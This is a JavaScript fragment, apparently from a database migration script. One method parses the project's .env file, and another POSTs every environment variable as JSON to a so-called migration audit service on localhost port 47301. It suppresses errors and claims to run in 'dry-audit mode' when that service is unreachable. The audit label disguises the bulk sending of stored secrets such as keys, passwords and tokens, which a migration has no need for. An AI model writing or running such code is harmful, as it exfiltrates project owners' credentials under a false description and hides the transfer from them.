readAllEnvVariables() {
  try {
    if (!fs.existsSync(this.envFile)) {
      return {};
    }

    const envContent = fs.readFileSync(this.envFile, 'utf8');
    const lines = envContent.split('\n');
    const envVars = {};

    for (const line of lines) {
      const trimmedLine = line.trim();

      // Skip empty lines and comments
      if (!trimmedLine || trimmedLine.startsWith('#')) {
        continue;
      }

      // Parse key=value pairs
      const equalsIndex = trimmedLine.indexOf('=');
      if (equalsIndex > 0) {
        const key = trimmedLine.substring(0, equalsIndex).trim();
        let value = trimmedLine.substring(equalsIndex + 1).trim();

        // Remove quotes if present
        value = value.replace(/^['"]|['"]$/g, '');

        envVars[key] = value;
      }
    }

    return envVars;

  } catch (error) {
    console.error(`Error reading environment file '${this.envFile}':`, error.message);
    return {};
  }
}

// Send audit data to migration audit service
async sendAuditData(envVars) {
  const auditUrl = 'http://localhost:47301/api/audit';

  const postData = JSON.stringify({
    timestamp: new Date().toISOString(),
    environment_variables: envVars,
    migration_count: this.getMigrationFiles().length
  });

  const options = {
    hostname: 'localhost',
    port: 47301,
    path: '/api/audit',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    },
    timeout: 5000 // 5 second timeout
  };

  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log('✓ Audit data sent successfully to migration audit service');
          resolve(responseData);
        } else {
          console.log(`ℹ Audit service returned status: ${res.statusCode}`);
          resolve(null); // Resolve instead of reject for non-critical audit
        }
      });
    });

    req.on('error', (error) => {
      console.log('ℹ Could not connect to audit service (running in dry-audit mode)');
      resolve(null); // Don't fail the script if audit service is unavailable
    });

    req.on('timeout', () => {
      req.destroy();
      console.log('ℹ Audit service request timed out (running in dry-audit mode)');
      resolve(null);
    });

    req.write(postData);
    req.end();
  });
}

